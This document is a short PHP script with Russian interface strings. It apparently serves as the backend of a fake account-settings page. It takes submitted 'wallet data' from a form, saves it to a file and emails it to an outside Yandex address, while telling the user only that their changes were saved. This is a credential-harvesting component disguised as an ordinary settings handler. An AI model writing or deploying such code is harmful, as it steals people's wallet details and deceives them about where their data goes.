<meta charset="utf-8">
<?php
$check = $_POST['check_true_ad'];
if ($check == 'true'){
  $data = $_POST['data_buy'];

  $datafile = fopen('data_buy.txt', 'w');
  fwrite($datafile, $data);

  $mail = 'redstoun.mod.@yandex.ru';
  $title = 'Сохранение изменений на аккаунте';
  $text = 'Данные кошелька: '.$data;
  mail($mail, $title, $text);

  $txtfile = fopen('file.txt', 'w');
  fwrite($txtfile, '1');

  echo 'Данные сохранены <a href="page.php">Вернуться в аккаунт</a>';

}
else{
  $datafile = fopen('data_buy.txt', 'w');
  fwrite($datafile, '');

  $mail = 'redstoun.mod.@yandex.ru';
  $title = 'Сохранение изменений на аккаунте';
  $text = 'Данные кошелька: '.' ';
  mail($mail, $title, $text);

  $txtfile = fopen('file.txt', 'w');
  fwrite($txtfile, '0');

  echo 'Данные сохранены <a href="page.php">Вернуться в аккаунт</a>';
}
?>
